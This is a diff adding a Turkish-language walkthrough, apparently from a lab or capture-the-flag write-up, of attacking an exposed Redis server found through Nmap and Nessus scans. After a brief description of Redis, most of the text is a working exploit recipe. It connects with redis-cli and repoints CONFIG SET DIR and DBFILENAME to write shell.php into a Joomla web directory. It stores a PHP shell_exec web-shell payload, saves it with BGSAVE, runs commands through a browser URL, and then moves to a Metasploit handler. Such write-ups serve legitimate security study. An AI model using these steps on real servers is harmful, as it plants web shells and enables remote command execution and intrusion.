@@ -1,0 +1,29 @@
+Nmap taramasında ve Nessus taramasında redis sunucunu görmüştük nessusta yine redis üzerinde 10.0 dereceli bri zaafiyet görmüştük ilk başta redis hakkında  araştırma yapalım 
+
+Redis, verileri bilgisayarın ana belleğinde (RAM) anahtar-değer (key-value) mantığıyla saklayan, açık kaynak kodlu ve çok hızlı bir NoSQL veri tabanı sistemidi
+
+Bellek İçi (In-Memory) Çalışma: Disk okuma gecikmelerini ortadan kaldırır.Zengin Veri Tipleri: 
+Sadece metin değil; liste (list), küme (set), hash ve sıralı küme (sorted set) gibi yapıları da destekler.Hız: Saniyede yüz binlerce isteği işleyebilir
+
+şimdi terminal ekraına geri dönüyoruz ve redis-cli -h <ip> yazarak redis sunucusuna bağlanıyoruz ondan sonra sırayla şu komutları çalıştırıyoruz ;
+
+CONFIG SET DIR /var/www/html/joomla/tmp/
+
+bu komut Redis’in veritabanı dosyasını kaydedeceği dizini değiştirir. 
+
+CONFIG SET DBFILENAME shell.php
+
+kaydedilecek veritabanı dosyasının adını shell.php yapar.
+
+set PAYLOAD "<?php echo shell_exec($_GET['e'].' 2>&1'); ?>"
+
+Redis’te PAYLOAD adında bir anahtar oluşturup değerine PHP kodunu koyar bu payloadı https://www.grobinson.me/single-line-php-script-to-gain-shell/ sitesinden alındı single line shell
+diye aratırsanız hepsini payload oalrak koyulabilir
+
+BGSAVE 
+
+diyerek kaydediyoruz sonra internet tarayıcısndan ;
+
+http://<ip>:8081/tmp/shell.php?e=ls veya burada artık bash kodlarını yazarak shelli almış oluyorum 
+
+buradan sonra msfconsole üzerinden handler başlatıp shelli daha düzgün bir ortamda alabilriz 
